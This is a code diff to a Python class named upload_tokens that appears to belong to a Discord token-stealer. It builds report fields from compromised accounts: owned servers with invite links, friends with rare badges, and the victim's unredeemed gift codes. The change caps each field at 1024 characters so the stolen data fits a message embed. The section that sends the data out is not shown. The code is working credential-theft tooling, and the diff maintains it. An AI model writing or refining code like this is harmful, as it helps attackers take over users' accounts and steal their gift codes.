@@ -267,7 +267,12 @@ class upload_tokens:
                         else:
                             invite = "https://youtu.be/dQw4w9WgXcQ"
 
-                        hq_guilds.append(f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})")
+                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+                        
+                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
+                            break
+
+                        hq_guilds.append(data)
 
                 if len(hq_guilds) > 0:
                     hq_guilds = '\n'.join(hq_guilds)
@@ -289,7 +294,13 @@ class upload_tokens:
                     if inds != []:
                         hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                             friend['user']['public_flags'])[::-1]])
-                        hq_friends.append(f'{hq_badges} - `{friend["user"]["username"]}#{friend["user"]["discriminator"]} ({friend["user"]["id"]})`')  
+
+                        data = f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"
+
+                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
+                            break
+
+                        hq_friends.append(data)
 
                 if len(hq_friends) > 0:
                     hq_friends = '\n'.join(hq_friends)
@@ -306,7 +317,12 @@ class upload_tokens:
                     name = code['promotion']['outbound_title']
                     code = code['code']
 
-                    codes.append(f":gift: `{name}`\n:ticket: `{code}`")
+                    data = f":gift: `{name}`\n:ticket: `{code}`"
+
+                    if len('\n\n'.join(codes)) + len(data) >= 1024:
+                        break
+
+                    codes.append(data)
 
                 if len(codes) > 0:
                     codes = '\n\n'.join(codes)
